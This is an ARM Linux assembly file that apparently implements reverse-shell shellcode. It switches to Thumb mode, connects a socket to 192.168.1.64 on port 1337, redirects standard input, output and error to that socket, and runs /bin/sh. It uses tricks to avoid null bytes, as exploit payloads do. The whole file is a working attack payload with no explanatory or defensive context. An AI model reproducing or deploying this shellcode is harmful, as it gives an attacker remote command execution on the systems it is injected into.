.section .text
.global _start

_start:
    .code 32
    
    // switching to THUMB mode
    add r3, pc, #1
    bx r3

    .code 16
    // socket(AF_INET, SOCK_STREAM, 0) (2, 1, 0)
    mov r7, #200
    add r7, #81
    mov r0, #2
    sub r1, r0, #1
    sub r2, r1, #1
    swi #1

    mov r4, r0 // save sockfd

    // connect(sockfd, &saddr, 0x10)

    add r7, #2
    mov r0, r4
    adr r1, struct_addr
    strb r2, [r1, #1]
    mov r2, #0x10
    swi #1

    // dup2(sockfd, [0, 1, 2])
    mov r7, #63
    eor r1, r1
    nop
    dupfd:
        mov r0, r4
        swi #1
        add r1, #1
        cmp r1, #2
        ble dupfd

    // execve("/bin/sh", NULL, NULL)

    mov r7, #0xb
    adr r0, binsh
    eor r1, r1
    eor r2, r2
    strb r1, [r0, #7]
    swi #1

    // close(sockfd)
    mov r7, #6
    mov r0, r4
    swi #1

    struct_addr:
    .ascii "\x02\xff"
    .ascii "\x05\x39" /* 1337 */
    .byte 0xc0,0xa8,0x1,0x40 /* 192.168.1.64 */
    binsh:
    .ascii "/bin/shx"
